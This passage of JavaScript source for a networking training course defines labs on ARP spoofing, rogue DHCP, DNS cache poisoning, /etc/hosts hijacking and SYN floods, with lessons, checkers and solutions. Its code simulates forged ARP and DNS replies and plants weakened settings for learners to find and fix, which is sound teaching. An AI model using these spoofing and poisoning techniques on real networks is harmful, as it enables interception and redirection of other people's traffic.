      return [P.arpRep(t + 0.012, EVIL_MAC, "10.20.0.1", W.MY_MAC, ME), P.arpReq(t + 0.4, EVIL_MAC, EVIL, "10.20.0.21"), P.arpRep(t + 1.012, EVIL_MAC, "10.20.0.1", W.MY_MAC, ME), P.arpRep(t + 2.012, EVIL_MAC, "10.20.0.1", W.MY_MAC, ME)];
    };
    T.M2.buildNic(sys);
    nw.rogueDhcp = ROGUE;
    nw.extraPeers.build = Object.assign({}, nw.extraPeers.build); nw.extraPeers.build[ROGUE.router] = { name: null, node: null, mac: ROGUE.mac, rtt: 0.3, router: "gw" };
    M2.putRoot(sys, "/home/dev/inventory.csv", INVENTORY, 436, 1000, 1000, NOW - 30 * DAY);
  }
  function gwPinned(r) { var n = r.sys.nw.neigh["10.20.0.1"]; return n && n.perm && n.mac === W.MAC.gw; }
  LABS.push({
    id: "net-303", n: 24, module: 3, ticket: "NET-303", xp: 170, layer: "L2",
    title: "Someone in the middle",
    topic: "ARP spoofing, rogue DHCP servers, and how switches defend",
    from: DEV,
    story: "<p>The monitoring box says kc-web-01's round trips to the internet got a little <b>slower</b> this morning, with no change on our side. Then kc-web-01 joined the build network on eth1 and picked up a strange default gateway.</p><p>I think something on our LAN is answering for addresses that aren't its own. Find it, prove it, and protect kc-web-01 while the network team pulls the cable. <code>~/inventory.csv</code> has every machine's real MAC address.</p>",
    learn:
      "<h3>ARP has no authentication</h3><p>To reach the gateway, kc-web-01 asks \"who has 10.20.0.1?\" and believes whatever MAC answers. Worse, hosts accept answers they never asked for. An attacker on the LAN keeps sending <b>forged ARP replies</b> (\"10.20.0.1 is at MY MAC\"), so your traffic goes to them first; they forward it on so nothing looks broken. That's <b>ARP spoofing</b>, the classic man in the middle.</p>" +
      "<h3>Spotting it</h3>" + ex("ip neigh show 10.20.0.1") + "<p>Compare the MAC with the inventory. In a capture, look for ARP replies nobody asked for, and for one MAC claiming two addresses:</p>" + ex("sudo tcpdump -i eth0 -n -e -c 6 arp") +
      "<p><code>arping</code> asks directly and shows every MAC that answers; a hop that shouldn't exist shows up in <code>traceroute</code> (the forwarding machine decrements the TTL):</p>" + ex("sudo arping -c 3 -I eth0 10.20.0.1") + ex("traceroute -n 1.1.1.1") +
      "<h3>Protecting one host: a static ARP entry</h3><p>A <b>permanent</b> neighbour entry can't be overwritten by forged replies:</p>" + code("sudo ip neigh replace 10.20.0.1 lladdr REAL_MAC dev eth0 nud permanent") +
      "<p>It doesn't scale (every host, every MAC change), so networks fix this on the switch: <b>Dynamic ARP Inspection</b> drops ARP replies that don't match the switch's records.</p>" +
      "<h3>Rogue DHCP</h3><p>DHCP is the same story: a new machine broadcasts \"I need an address\" and takes the <b>first</b> offer. A rogue DHCP server answers faster and hands out <b>itself</b> as the gateway and DNS server. Watch the exchange:</p>" + code("sudo tcpdump -i eth1 -n -v port 67 or port 68 &\nsudo netplan apply\nsudo pkill tcpdump") +
      "<p>Two Offers from different servers is the giveaway. The switch-side defence is <b>DHCP snooping</b>: only the ports where real DHCP servers live may send offers.</p>" + CAPTURE_HELP,
    system: mitmSys,
    diagram: ["evil"],
    starter: "",
    objectives: [
      {
        id: "neigh", text: "Look at kc-web-01's neighbour (ARP) table. The gateway's MAC isn't the one in <code>~/inventory.csv</code>. Write the MAC kc-web-01 is <b>using</b> for 10.20.0.1 to <code>~/gw-mac-seen.txt</code>.",
        hints: ["ip neigh shows IP → MAC. grep the inventory for kc-gw-01.", "ip neigh show 10.20.0.1\ngrep kc-gw-01 ~/inventory.csv\necho " + EVIL_MAC + " > ~/gw-mac-seen.txt"],
        check: function (r) { if (!ran(r, /\bip\s+(-\w+\s+)*n(eigh(bour)?)?\b/, function (e) { return outHas(e, /10\.20\.0\.1 dev eth0 lladdr/); })) return "Show the neighbour table (ip neigh)."; return word(r, "gw-mac-seen.txt") === EVIL_MAC ? true : "The lladdr ip neigh shows for 10.20.0.1."; }
      },
      {
        id: "who", text: "Capture ARP (with Ethernet headers) and find who owns that MAC: it also asks questions under <b>its own</b> address. Write that IP to <code>~/attacker.txt</code>.",
        hints: ["sudo tcpdump -i eth0 -n -e -c 6 arp: look for the same MAC in a who-has ... tell line.", "sudo tcpdump -i eth0 -n -e -c 6 arp\necho " + EVIL + " > ~/attacker.txt"],
        check: function (r) { if (!ran(r, /\btcpdump\b.*\barp\b/, function (e) { return outHas(e, new RegExp(EVIL_MAC)); })) return "Capture ARP packets with -e to see the MAC addresses."; return word(r, "attacker.txt") === EVIL ? true : "Which address does that MAC use when it asks its own questions?"; }
      },
      {
        id: "path", text: "Show the extra hop: <code>traceroute -n 1.1.1.1</code> should start at the gateway, but it doesn't.",
        hints: ["traceroute -n 1.1.1.1: look at hop 1.", "traceroute -n 1.1.1.1"],
        check: function (r) { return ran(r, /\btraceroute\b.*1\.1\.1\.1/, function (e) { return e.out.some(function (l) { return /^\s*1\s+10\.20\.0\.66\b/.test(l); }); }) ? true : "Run traceroute -n 1.1.1.1 while the spoofing is active and look at the first hop."; }
      },
      {
        id: "pin", text: "Pin the gateway's <b>real</b> MAC (from the inventory) as a permanent neighbour entry on eth0, then show that traceroute's first hop is the gateway again.",
        hints: ["ip neigh replace 10.20.0.1 lladdr MAC dev eth0 nud permanent, then traceroute again.", "sudo ip neigh replace 10.20.0.1 lladdr " + W.MAC.gw + " dev eth0 nud permanent\ntraceroute -n 1.1.1.1"],
        check: function (r) {
          if (!gwPinned(r)) return "Add a permanent entry: 10.20.0.1 → the inventory's MAC for kc-gw-01, on eth0.";
          var k = idx(r, /\bip\s+(-\w+\s+)*n(eigh(bour)?)?\s+(add|replace|change)\b/);
          return after(r, k, /\btraceroute\b/, function (e) { return e.out.some(function (l) { return /^\s*1\s+10\.20\.0\.1\b/.test(l); }); }) ? true : "Run traceroute again after pinning: hop 1 should be 10.20.0.1.";
        }
      },
      {
        id: "dhcp", text: "Bring up eth1 on the build network (its netplan file is <code>~/02-build.yaml</code>) while capturing DHCP on eth1. Two servers answer. Write the <b>rogue</b> server's address to <code>~/rogue-dhcp.txt</code>.",
        hints: ["Copy 02-build.yaml into /etc/netplan (mode 600), bring eth1 up (tcpdump needs it up), start tcpdump on eth1 for ports 67/68 in the background, netplan apply, stop it. The real server is kc-gw-01 (10.20.60.1).", "sudo cp ~/02-build.yaml /etc/netplan/\nsudo chmod 600 /etc/netplan/02-build.yaml\nsudo ip link set eth1 up\nsudo tcpdump -i eth1 -n -v port 67 or port 68 &\nsudo netplan apply\nsudo pkill tcpdump\necho " + ROGUE.server + " > ~/rogue-dhcp.txt"],
        check: function (r) {
          if (!anyOut(r, new RegExp(ROGUE.server.replace(/\./g, "\\.") + "\\.67 > .*(Offer|BOOTP\\/DHCP)|DHCP-Message.*Offer"))) return "Capture the DHCP exchange on eth1 (ports 67 and 68) while netplan brings eth1 up.";
          return word(r, "rogue-dhcp.txt") === ROGUE.server ? true : "Which DHCP server isn't kc-gw-01 (10.20.60.1)?";
        }
      },
      {
        id: "route", text: "The rogue's lease gave kc-web-01 a <b>second default route</b> through the attacker. Find it, then make eth1 static (<code>10.20.60.15/24</code>, no DHCP, no default route) and apply it, so only eth0's default remains.",
        hints: ["ip route shows two default lines. Edit /etc/netplan/02-build.yaml: dhcp4: false and addresses: [10.20.60.15/24].", "ip route\nsudo nano /etc/netplan/02-build.yaml (dhcp4: false, addresses: [10.20.60.15/24])\nsudo netplan apply\nip route"],
        check: function (r) {
          if (!ran(r, /\bip\s+(-\w+\s+)*r(oute)?\b/, function (e) { return outHas(e, /^default via 10\.20\.60\.66 dev eth1/); })) return "Look at the routing table while eth1 has the rogue lease: ip route.";
          var nw = r.sys.nw, e1 = nw.ifs.eth1;
          if (!e1 || !e1.addrs.some(function (a) { return a.ip === "10.20.60.15" && a.prefix === 24 && !a.dhcp; })) return "eth1 should have the static address 10.20.60.15/24 (dhcp4: false).";
          var defs = nw.routes.filter(function (x) { return x.dst === "0.0.0.0" && x.prefix === 0 || x.to === "default"; });
          if (nw.routes.some(function (x) { return (x.prefix === 0) && x.via === ROGUE.router; })) return "The default route through 10.20.60.66 is still there.";
          void defs;
          return N.reach(r.sys, "1.1.1.1", { quiet: true }).dev === "eth0" ? true : "Internet traffic should leave through eth0 again.";
        }
      }
    ],
    solution: lines("ip neigh show 10.20.0.1", "grep kc-gw-01 ~/inventory.csv", "echo " + EVIL_MAC + " > ~/gw-mac-seen.txt",
      "sudo tcpdump -i eth0 -n -e -c 6 arp", "echo " + EVIL + " > ~/attacker.txt", "traceroute -n 1.1.1.1",
      "sudo ip neigh replace 10.20.0.1 lladdr " + W.MAC.gw + " dev eth0 nud permanent", "traceroute -n 1.1.1.1",
      "sudo cp ~/02-build.yaml /etc/netplan/", "sudo chmod 600 /etc/netplan/02-build.yaml", "sudo ip link set eth1 up", "sudo tcpdump -i eth1 -n -v port 67 or port 68 &", "sudo netplan apply", "sudo pkill tcpdump", "echo " + ROGUE.server + " > ~/rogue-dhcp.txt",
      "ip route", "sudo nano /etc/netplan/02-build.yaml", "    network:", "      version: 2", "      ethernets:", "        eth1:", "          dhcp4: false", "          addresses: [10.20.60.15/24]", "sudo netplan apply", "ip route"),
    debrief: "<p>Two attacks from one machine. <b>10.20.0.66</b> sent a stream of forged ARP replies claiming to be the gateway, so kc-web-01 handed it every packet bound for the internet; it forwarded them on, which is why things only got <i>slower</i>. On the build network the same box ran a <b>rogue DHCP server</b> that answered first and made itself a gateway.</p><p>Your static ARP entry protects kc-web-01, and a static address on eth1 ignores DHCP entirely. The real fixes are on the switch: Dynamic ARP Inspection and DHCP snooping, plus 802.1X so unknown machines don't get a port at all. And TLS everywhere means a man in the middle sees only ciphertext.</p>",
    realworld: "arp -a (Windows, macOS) or ip neigh (Linux) shows your own ARP cache: two IPs with the same MAC on a home network usually just means your router, but on a work LAN it's worth a question.",
    quiz: [
      { q: "Why does ARP spoofing work?", options: ["ARP is encrypted badly", "Hosts believe ARP replies without any proof, even unrequested ones", "Switches forward ARP to the internet", "IPv4 has no MAC addresses"], answer: 1, why: "ARP has no authentication at all." },
      { q: "Which switch feature stops rogue DHCP servers?", options: ["VLANs", "DHCP snooping", "Spanning tree", "Jumbo frames"], answer: 1, why: "Only trusted ports may send DHCP offers." },
      { q: "A man in the middle forwards your HTTPS traffic. What can they read?", options: ["Everything", "Addresses, sizes, timing and the server name, not the content", "Nothing at all", "Only cookies"], answer: 1, why: "Unless they get you to accept a fake certificate, TLS protects the content." }
    ]
  });

  /* ================================================================== NET-304 DNS spoofing & cache poisoning */
  var FAKE = "198.51.100.66";
  function poisonCapture() {
    var t0 = at(3), L2 = [], NS = "198.51.100.53", RES = "10.20.0.2";
    // the resolver asks the authoritative server; the attacker races it with forged answers guessing the ID
    L2.push(P.udp(t0, RES, NS, 33017, 53, { dns: { id: 0x5a3c, q: "kestrel.example.com", qt: "A" } }));
    var ids = [];
    for (var i = 0; i < 40; i++) ids.push((0x5a00 + i * 0x0b) & 0xffff);
    ids[29] = 0x5a3c;
    ids.forEach(function (id, i) { L2.push(P.udp(t0 + 0.0004 + i * 0.00002, NS, RES, 53, 33017, { dns: { id: id, q: "kestrel.example.com", qt: "A", resp: true, an: [{ type: "A", data: FAKE, ttl: 604800 }] }, eth: { src: EVIL_MAC, dst: W.MAC.dns } })); });
    L2.push(P.udp(t0 + 0.0182, NS, RES, 53, 33017, { dns: { id: 0x5a3c, q: "kestrel.example.com", qt: "A", resp: true, an: [{ type: "A", data: W.PUB, ttl: 300 }] } }));
    return sortT(L2);
  }
  function poisonSys(sys) {
    M3.preinstall(sys, "tshark");
    sys.nw.poison = { "127.0.0.53": { "kestrel.example.com|A": { data: FAKE, ttl: 604783 } } };
    var h = M2.rd(sys, "/etc/hosts") || "";
    M2.putRoot(sys, "/etc/hosts", h.replace(/\n*$/, "\n") + "203.0.113.200\tapi.partner-pay.example\n", 420, 0, 0, NOW - 3 * HOUR);
  }
  LABS.push({
    id: "net-304", n: 25, module: 3, ticket: "NET-304", xp: 160, layer: "L7",
    title: "The wrong address",
    topic: "DNS spoofing, cache poisoning, /etc/hosts tampering",
    from: MAYA,
    story: "<p>Our health check from kc-web-01 to <b>https://kestrel.example.com</b> started failing an hour ago, but customers are fine and the site works from my laptop. kc-web-01 is the only machine with the problem.</p><p>Dev saw a burst of strange DNS replies on the server LAN earlier (<code>~/captures/dns-burst.pcap</code>) and thinks someone tried to <b>poison</b> a DNS cache. Find out what kc-web-01 believes, why, and fix it.</p>",
    learn:
      "<h3>DNS answers aren't signed (usually)</h3><p>A resolver sends a question over UDP and accepts the first reply that matches the question, the port and the 16-bit <b>transaction ID</b>. An attacker who can guess those and answer before the real server gets their fake answer <b>cached</b>, for as long as the TTL they chose. Everyone using that cache goes to the wrong address.</p>" +
      "<h3>Compare answers</h3><p>Ask your normal resolver, then ask others directly, then ask the domain's own authoritative server:</p>" + ex("dig kestrel.example.com +noall +answer") + ex("dig @1.1.1.1 kestrel.example.com +noall +answer") + ex("dig NS kestrel.example.com +short") +
      "<p>Signs of a forged record: an address that nobody else returns, and a <b>TTL</b> far longer than the zone uses (attackers pick days, so the poison lasts).</p>" +
      "<h3>The race, in a capture</h3><p>A poisoning attempt is a flood of replies to one question, each with a different transaction ID, all \"from\" the real server's address. Only the one whose ID matches the question is accepted:</p>" + ex("tshark -r FILE -T fields -e dns.id -e dns.flags.response -e dns.a -e dns.resp.ttl") +
      "<h3>Clearing a poisoned cache</h3><p>On Ubuntu the local cache belongs to systemd-resolved:</p>" + code("sudo resolvectl flush-caches") +
      "<h3>Not DNS at all: /etc/hosts</h3><p>Programs check <code>/etc/hosts</code> <b>before</b> DNS. A line added there redirects a name silently, and dig (which only asks DNS) won't show it. <code>getent hosts NAME</code> resolves the way programs do:</p>" + ex("getent hosts api.partner-pay.example") + ex("dig +short api.partner-pay.example") +
      '<div class="callout">The real defences: <b>DNSSEC</b> signs answers so forgeries fail validation (Module 4), resolvers randomise source ports as well as IDs, and TLS certificates mean a fake address still can\'t prove it\'s your site.</div>',
    files: { "captures/dns-burst.pcap": N.pcapFile(poisonCapture()) },
    system: poisonSys,
    diagram: ["site"],
    starter: "",
    objectives: [
      {
        id: "ask", text: "Show what kc-web-01's resolver says <code>kestrel.example.com</code> is, and what <code>1.1.1.1</code> says. Write the <b>fake</b> address to <code>~/fake-ip.txt</code> and the real one to <code>~/real-ip.txt</code>.",
        hints: ["dig kestrel.example.com, then dig @1.1.1.1 kestrel.example.com.", "dig kestrel.example.com +noall +answer\ndig @1.1.1.1 kestrel.example.com +noall +answer\necho " + FAKE + " > ~/fake-ip.txt\necho " + W.PUB + " > ~/real-ip.txt"],
        check: function (r) {
          if (!ran(r, /\bdig\b(?!.*@)/, function (e) { return outHas(e, new RegExp(FAKE.replace(/\./g, "\\."))); })) return "Ask the local resolver: dig kestrel.example.com.";
          if (!ran(r, /\bdig\b.*@1\.1\.1\.1|\bdig\b.*@8\.8\.8\.8|\bdig\b.*@1\.0\.0\.1/, function (e) { return outHas(e, /203\.0\.113\.80/); })) return "Ask a public resolver directly: dig @1.1.1.1 kestrel.example.com.";
          return word(r, "fake-ip.txt") === FAKE && word(r, "real-ip.txt") === W.PUB ? true : "~/fake-ip.txt and ~/real-ip.txt: one address each.";
        }
      },
      {
        id: "ttl", text: "The forged record's <b>TTL</b> gives it away. Write the TTL the local resolver reports to <code>~/fake-ttl.txt</code>, and the zone's normal TTL (from 1.1.1.1) to <code>~/real-ttl.txt</code>.",
        hints: ["The second column of an answer line is the TTL in seconds.", "dig kestrel.example.com +noall +answer\ndig @1.1.1.1 kestrel.example.com +noall +answer"],
        check: function (r) { var f = +word(r, "fake-ttl.txt"), g = +word(r, "real-ttl.txt"); return f > 600000 && f <= 604800 && g > 0 && g <= 300 ? true : "Copy the TTLs from the two dig answers (seconds)."; }
      },
      {
        id: "race", text: "In <code>~/captures/dns-burst.pcap</code>, count the <b>replies</b> to the resolver's single question and find the transaction ID the question used. Write the count to <code>~/replies.txt</code> and the ID (like <code>0x1234</code>) to <code>~/query-id.txt</code>.",
        hints: ["tshark fields dns.id and dns.flags.response: the question is the only packet with response 0.", "tshark -r ~/captures/dns-burst.pcap -Y 'dns.flags.response == 1' | wc -l\ntshark -r ~/captures/dns-burst.pcap -Y 'dns.flags.response == 0' -T fields -e dns.id"],
        check: function (r) { if (!readCap(r, "dns-burst.pcap")) return "Read ~/captures/dns-burst.pcap."; if (word(r, "replies.txt") !== "41") return "Count every reply (response flag 1) in the capture."; return word(r, "query-id.txt") === "0x5a3c" ? true : "The question's transaction ID (dns.id of the packet with response 0)."; }
      },
      {
        id: "flush", text: "Flush systemd-resolved's cache and show <code>kestrel.example.com</code> resolving to the real address again.",
        hints: ["resolvectl has a command for it, as root.", "sudo resolvectl flush-caches\ndig kestrel.example.com +noall +answer"],
        check: function (r) {
          if (r.sys.nw.poison && r.sys.nw.poison["127.0.0.53"]) return "The local cache still holds the forged record: flush it.";
          var k = idx(r, /\bresolvectl\s+flush-caches\b/);
          return after(r, k, /\b(dig|getent|host|resolvectl\s+query|curl)\b/, function (e) { return outHas(e, /203\.0\.113\.80/); }) ? true : "Resolve the name again to show the real address.";
        }
      },
      {
        id: "hosts", text: "One more name is hijacked, but <b>not</b> through DNS: <code>getent hosts api.partner-pay.example</code> and <code>dig</code> disagree. Find out why and remove the cause.",
        hints: ["getent reads /etc/hosts first; dig never does. Look at /etc/hosts.", "getent hosts api.partner-pay.example\ndig +short api.partner-pay.example\ngrep partner-pay /etc/hosts\nsudo sed -i '/partner-pay/d' /etc/hosts"],
        check: function (r) {
          if (!ran(r, /\bgetent\s+(a)?hosts\b.*partner-pay/)) return "Resolve it the way programs do: getent hosts api.partner-pay.example.";
          return /partner-pay/.test(r.read("/etc/hosts") || "") ? "Something in /etc/hosts still redirects it." : true;
        }
      }
    ],
    solution: lines("dig kestrel.example.com +noall +answer", "dig @1.1.1.1 kestrel.example.com +noall +answer", "echo " + FAKE + " > ~/fake-ip.txt", "echo " + W.PUB + " > ~/real-ip.txt", "echo 604783 > ~/fake-ttl.txt", "echo 300 > ~/real-ttl.txt",
      "tshark -r ~/captures/dns-burst.pcap -T fields -e dns.id -e dns.flags.response -e dns.a -e dns.resp.ttl", "tshark -r ~/captures/dns-burst.pcap -Y 'dns.flags.response == 1' | wc -l", "echo 41 > ~/replies.txt", "tshark -r ~/captures/dns-burst.pcap -Y 'dns.flags.response == 0' -T fields -e dns.id", "echo 0x5a3c > ~/query-id.txt",
      "sudo resolvectl flush-caches", "dig kestrel.example.com +noall +answer",
      "getent hosts api.partner-pay.example", "dig +short api.partner-pay.example", "grep partner-pay /etc/hosts", "sudo sed -i '/partner-pay/d' /etc/hosts"),
    debrief: "<p>The burst was a cache-poisoning race: 40 forged replies \"from\" the authoritative server, each guessing a different transaction ID. The 30th guessed right (0x5a3c) and arrived before the real answer, so kc-web-01's cache stored <b>198.51.100.66</b> for a week. Flushing the cache fixed it; the attacker's address never had our certificate, which is why the health check failed instead of quietly talking to them.</p><p>The partner API was hijacked the low-tech way: a line in <code>/etc/hosts</code>, which nothing about DNS would ever show. Always resolve with <code>getent</code> when what a program does and what dig says disagree.</p>",
    realworld: "Try dig example.com then dig @1.1.1.1 example.com and compare; nslookup works the same on Windows. Check /etc/hosts (C:\\Windows\\System32\\drivers\\etc\\hosts) on your own machines: malware loves it.",
    quiz: [
      { q: "What must a forged DNS reply match to be accepted?", options: ["Nothing", "The question, the port and the 16-bit transaction ID", "A signature", "The TTL"], answer: 1, why: "That's why resolvers randomise IDs and ports: more to guess." },
      { q: "dig says one address, ping goes to another. First thing to check?", options: ["The firewall", "/etc/hosts (getent hosts NAME)", "The MTU", "The certificate"], answer: 1, why: "dig asks DNS only; programs read /etc/hosts first." },
      { q: "What actually stops forged answers?", options: ["Longer TTLs", "DNSSEC signatures", "TCP", "Bigger caches"], answer: 1, why: "A validating resolver rejects answers whose signatures don't verify." }
    ]
  });

  /* ================================================================== NET-305 Floods & DoS */
  var TUNING = "# Network tuning from a blog post (2026-11-10)\nnet.core.somaxconn = 4096\nnet.ipv4.tcp_max_syn_backlog = 256\nnet.ipv4.tcp_syncookies = 0\nnet.ipv4.tcp_fin_timeout = 15\n";
  function floodSys(sys) {
    sys.nw.synFlood = { port: 443, count: 256 };
    sys.nw.sysctl["net.ipv4.tcp_syncookies"] = "0";
    sys.nw.sysctl["net.ipv4.tcp_max_syn_backlog"] = "256";
    M2.putRoot(sys, "/etc/sysctl.d/60-net-tuning.conf", TUNING, 420, 0, 0, NOW - DAY);
  }
  function cookiesOn(r) { return r.sys.nw.sysctl["net.ipv4.tcp_syncookies"] === "1"; }
  var KESTREL_LOGIN = "server {\n\tlisten 80;\n\tlisten [::]:80;\n\tserver_name kestrel.example.com www.kestrel.example.com shop.kestrel.example.com;\n\n\t# Let's Encrypt fetches renewal challenges over plain HTTP\n\tlocation /.well-known/acme-challenge/ {\n\t\troot /var/www/letsencrypt;\n\t}\n\n\tlocation / {\n\t\treturn 301 https://$host$request_uri;\n\t}\n}\n\nserver {\n\tlisten 443 ssl;\n\tlisten [::]:443 ssl;\n\thttp2 on;\n\tserver_name kestrel.example.com www.kestrel.example.com;\n\n\tssl_certificate /etc/letsencrypt/live/kestrel.example.com/fullchain.pem;\n\tssl_certificate_key /etc/letsencrypt/live/kestrel.example.com/privkey.pem;\n\n\troot /var/www/kestrel;\n\tadd_header Strict-Transport-Security \"max-age=31536000\" always;\n\tadd_header Alt-Svc 'h3=\":443\"; ma=86400';\n\n\tlocation /api/ {\n\t\tproxy_pass http://127.0.0.1:8080;\n\t}\n\n\tlocation /login {\n\t\tlimit_req zone=login burst=10 nodelay;\n\t\tlimit_req_status 429;\n\t\tproxy_pass http://127.0.0.1:8080;\n\t}\n}";
  LABS.push({
    id: "net-305", n: 26, module: 3, ticket: "NET-305", xp: 170, layer: "L3–4",
    title: "Half-open",
    topic: "SYN floods, the backlog, SYN cookies, rate limiting in nginx",
    from: MAYA,
    story: "<p><b>kestrel.example.com is down.</b> nginx is running, CPU is idle, memory is fine, but new HTTPS connections just hang. Existing SSH sessions work, so it isn't the network as a whole.</p><p>Someone also changed some kernel settings yesterday from a blog post. Find out what's happening, get the site answering again, and make the fix survive a reboot. While you're in there: <code>/login</code> gets hammered by password-guessing scripts; give it a rate limit.</p>",
    learn:
      "<h3>The SYN backlog</h3><p>When a SYN arrives, the kernel answers SYN-ACK and remembers the half-open connection in a queue, the <b>SYN backlog</b>, until the client's ACK arrives. A <b>SYN flood</b> sends SYNs from fake source addresses that never answer: the queue fills with connections that will never complete, and real clients' SYNs are dropped.</p>" +
      ex("ss -tan state syn-recv | head") + ex("sudo dmesg | grep -i 'syn flood'") +
      "<p>Each half-open connection shows as <code>SYN-RECV</code>; the kernel also logs a warning. In a capture you'd see SYNs from random addresses and never a final ACK:</p>" + ex("sudo tcpdump -i eth0 -n -c 5 'tcp[tcpflags] == tcp-syn and dst port 443'") +
      "<h3>SYN cookies</h3><p>With <code>net.ipv4.tcp_syncookies = 1</code> (Linux's default) the kernel stops storing state when the queue is full: it encodes the connection details into the SYN-ACK's sequence number and rebuilds them when the ACK comes back. Fake SYNs cost nothing; real clients get through.</p>" +
      code("sudo sysctl -w net.ipv4.tcp_syncookies=1        # now\n# and in a file under /etc/sysctl.d/, so it survives a reboot:\nsudo sysctl --system                               # reload every sysctl file") +
      "<p>Settings files are read in name order; the last one to set a key wins.</p>" +
      "<h3>Rate limiting at layer 7</h3><p>A flood of <b>real</b> requests (a script guessing passwords, a scraper) completes the handshake, so SYN cookies don't help. nginx can limit requests per client address:</p>" +
      code("# in the http { } block (e.g. /etc/nginx/conf.d/ratelimit.conf):\nlimit_req_zone $binary_remote_addr zone=login:10m rate=5r/s;\n\n# in the site's server { }:\nlocation /login {\n    limit_req zone=login burst=10 nodelay;\n    limit_req_status 429;\n    proxy_pass http://127.0.0.1:8080;\n}") +
      "<p>Each address may make 5 requests a second with bursts of 10; extra ones get <b>429 Too Many Requests</b>.</p>" +
      '<div class="callout">Big floods (tens of gigabits) fill your internet link before they reach the server. No setting on the server helps then: that\'s what DDoS protection services and CDNs are for.</div>',
    system: floodSys,
    diagram: ["site"],
    starter: "",
    objectives: [
      {
        id: "hang", text: "Show the symptom: <code>curl</code> the site with a <b>5 second</b> limit and watch it time out.",
        hints: ["curl -m 5 (max time).", "curl -sS -m 5 -o /dev/null https://kestrel.example.com/"],
        check: function (r) { return ran(r, /\bcurl\b.*(-m\s*\d|--max-time|--connect-timeout).*kestrel\.example\.com|\bcurl\b.*kestrel\.example\.com.*(-m\s*\d|--max-time|--connect-timeout)/, function (e) { return outHas(e, /\(28\)/); }) ? true : "curl -m 5 https://kestrel.example.com/ should time out (curl error 28)."; }
      },
      {
        id: "count", text: "Count the <b>half-open</b> connections on port 443 and write the number to <code>~/half-open.txt</code>.",
        hints: ["ss can filter by TCP state: state syn-recv. Don't count the header line.", "ss -tan state syn-recv | tail -n +2 | wc -l > ~/half-open.txt"],
        check: function (r) { if (!ran(r, /\bss\b.*syn-recv|\bss\b.*SYN-RECV|\bnetstat\b/)) return "List the SYN-RECV sockets with ss."; return word(r, "half-open.txt") === "256" ? true : "How many SYN-RECV sockets are there (without the header)?"; }
      },
      {
        id: "kernel", text: "Find the kernel's own warning about it.",
        hints: ["dmesg, as root, filtered for SYN.", "sudo dmesg | grep -i syn"],
        check: function (r) { return ran(r, /\bdmesg\b/, function (e) { return outHas(e, /Possible SYN flooding on port .*:443/); }) ? true : "sudo dmesg | grep -i syn"; }
      },
      {
        id: "cookies", text: "Find the file that turned SYN cookies <b>off</b>, fix it, and reload every sysctl file. Show the site answering again.",
        hints: ["grep -r syncookies /etc/sysctl.conf /etc/sysctl.d/, set it to 1, then sudo sysctl --system and curl again.", "grep -r syncookies /etc/sysctl.d/\nsudo sed -i 's/tcp_syncookies = 0/tcp_syncookies = 1/' /etc/sysctl.d/60-net-tuning.conf\nsudo sysctl --system\ncurl -sS -o /dev/null -w '%{http_code}\\n' https://kestrel.example.com/"],
        check: function (r) {
          var t = r.read("/etc/sysctl.d/60-net-tuning.conf");
          if (t !== null && /^\s*net\.ipv4\.tcp_syncookies\s*=\s*0/m.test(t)) return "60-net-tuning.conf still turns SYN cookies off: fix the file so it survives a reboot.";
          if (!cookiesOn(r)) return "SYN cookies are still off in the running kernel: sudo sysctl --system reloads the files.";
          var k = idx(r, /\bsysctl\b/);
          return after(r, k, /\bcurl\b.*kestrel\.example\.com/, function (e) { return !outHas(e, /\(28\)/) && (outHas(e, /^(200|HTTP\/2 200)/) || e.out.length > 0); }) ? true : "curl the site again to show it answers.";
        }
      },
      {
        id: "limit", text: "Rate-limit <code>/login</code>: a <code>limit_req_zone</code> of <b>5r/s</b> per client address and <code>limit_req zone=login burst=10 nodelay</code> answering <b>429</b>. Reload nginx and prove it: 20 quick requests should end in 429s.",
        hints: ["Zone in /etc/nginx/conf.d/ratelimit.conf; limit_req and limit_req_status 429 in a location /login in the site. nginx -t, reload, then a for loop of curls through sort | uniq -c.", "echo 'limit_req_zone $binary_remote_addr zone=login:10m rate=5r/s;' | sudo tee /etc/nginx/conf.d/ratelimit.conf\nsudo nano /etc/nginx/sites-available/kestrel (location /login { limit_req zone=login burst=10 nodelay; limit_req_status 429; proxy_pass http://127.0.0.1:8080; })\nsudo nginx -t && sudo systemctl reload nginx\nfor i in $(seq 20); do curl -s -o /dev/null -w '%{http_code}\\n' https://kestrel.example.com/login; done | sort | uniq -c"],
        check: function (r) {
          return ran(r, /\bcurl\b.*\/login/, function (e) { return e.out.some(function (l) { return /^\s*\d+\s+429\s*$/.test(l) || /^429$/.test(l.trim()); }) && e.out.some(function (l) { return /^\s*\d+\s+(200|30\d|401|404|502)\s*$/.test(l) || /^(200|30\d|401|404|502)$/.test(l.trim()); }); }) ? true : "Send about 20 requests to /login in one loop: some should pass, then 429s.";
        }
      }
    ],
    solution: lines.apply(null, ["curl -sS -m 5 -o /dev/null https://kestrel.example.com/", "ss -tan state syn-recv | head","ss -tan state syn-recv | tail -n +2 | wc -l > ~/half-open.txt", "sudo dmesg | grep -i syn",
      "grep -r syncookies /etc/sysctl.conf /etc/sysctl.d/", "sudo sed -i 's/tcp_syncookies = 0/tcp_syncookies = 1/' /etc/sysctl.d/60-net-tuning.conf", "sudo sysctl --system", "curl -sS -o /dev/null -w '%{http_code}\\n' https://kestrel.example.com/",
      "echo 'limit_req_zone $binary_remote_addr zone=login:10m rate=5r/s;' | sudo tee /etc/nginx/conf.d/ratelimit.conf", "sudo nano /etc/nginx/sites-available/kestrel"].concat(KESTREL_LOGIN.split("\n").map(function (l) { return "    " + l; })).concat([ "sudo nginx -t", "sudo systemctl reload nginx",
      "for i in $(seq 20); do curl -s -o /dev/null -w '%{http_code}\\n' https://kestrel.example.com/login; done | sort | uniq -c"])),
    debrief: "<p>A textbook SYN flood: 256 half-open connections from spoofed addresses filled the backlog of 256, and with SYN cookies switched off by yesterday's \"tuning\" the kernel dropped every new SYN, real customers included. Turning cookies back on made the flood harmless without blocking a single address (the sources were fake anyway, so blocking them would have been pointless).</p><p>The <code>/login</code> limit handles the other kind of flood: real, complete requests. Five a second per address is plenty for a human and useless for a password-guessing script.</p>",
    realworld: "sysctl net.ipv4.tcp_syncookies on any Linux box shows 1 by default: if you ever see a tuning guide set it to 0, ignore the guide. Cloud load balancers and CDNs absorb SYN floods before they reach you.",
    quiz: [
      { q: "What fills up during a SYN flood?", options: ["The disk", "The SYN backlog of half-open connections", "The routing table", "The ARP cache"], answer: 1, why: "Each spoofed SYN leaves a SYN-RECV entry until it times out." },
